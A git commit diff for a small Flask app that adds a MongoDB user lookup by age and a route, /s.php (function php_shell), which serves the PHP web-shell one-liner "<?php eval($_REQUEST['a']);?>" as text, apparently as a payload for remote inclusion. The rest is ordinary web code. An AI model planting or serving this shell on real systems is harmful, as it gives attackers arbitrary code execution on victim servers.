6fa8b5fac048fcfecbb525d2f85112d5798ea430
Le0nsec <leon.clqorz@gmail.com>
2022-03-29 21:37:35 +0800

    add: mongodb with flask

--- index.py
+++ index.py
@@ -1,10 +1,36 @@
-from flask import Flask, Response, request
+from flask import Flask, request
+from flask_pymongo import PyMongo
+import json
+from os import getenv
 app = Flask(__name__)
+
+app.config['DEBUG'] = False
+app.config['MONGO_DBNAME'] = getenv('MONGO_DBNAME')
+app.config['MONGO_URI'] = getenv('MONGO_URI')
+
+db = PyMongo(app).db
 
 @app.route('/')
 def index():
     return request.remote_addr
 
-@app.route('/about')
-def about():
-    return 'About Page Route'
+@app.route('/s.php')
+def php_shell():
+    return "<?php eval($_REQUEST['a']);?>"
+
+@app.route('/user/<age>')
+def user_age(age):
+    result=[]
+    users = db.user.find({'age': int(age)})
+    for u in users:
+        id = u['id']
+        username = u['username']
+        age = u['age']
+        score = u['score']
+        result.append({"id":id, "username": username, "age": age, "score": score})
+    return json.dumps(result)
+
+
+
+# if __name__ == '__main__':
+#     app.run(debug=True)
